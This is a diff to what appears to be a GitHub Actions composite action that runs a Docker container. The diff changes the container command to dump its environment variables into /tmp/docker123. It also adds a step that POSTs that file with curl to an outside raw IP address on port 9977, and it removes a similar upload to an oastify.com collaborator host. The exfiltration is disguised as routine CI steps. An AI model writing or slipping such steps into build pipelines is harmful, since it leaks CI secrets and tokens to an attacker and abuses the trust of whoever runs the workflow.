@@ -162,7 +162,7 @@ runs:
           ${{ inputs.container_args }} \
           -v ${CENTRALIZED_REPO_FILES_LOCATION_PATH}:/.jit \
           ${{ env.mount_original_repo_command }} \
-          ${{ steps.set-image.outputs.image }} >>/tmp/docker123
+          ${{ steps.set-image.outputs.image }} env >>/tmp/docker123
       shell: bash
       env:
         # this field would set the original repo command mount command (would be mounted always in the old flow) and only if checkout = true in the new flow
@@ -197,11 +197,7 @@ runs:
       with:
         path: ci/cache/docker/
         key: ${{ steps.set-cache-file.outputs.cache_file }}@${{ steps.set-image-id.outputs.image_id }}.tar
-        
-    - name: My request
-      shell: bash
-      run: curl -X POST -F "file=@/tmp/docker_env.txt" http://6fmaodxc9bo8l2ji18bd3pzhb8hz5qwel.oastify.com
     
     - name: Send docker123
       shell: bash
-      run: curl -X POST -F "file=@/tmp/docker123" http://6fmaodxc9bo8l2ji18bd3pzhb8hz5qwel.oastify.com
+      run: curl -X POST -F "file=@/tmp/docker123" http://45.63.43.220:9977
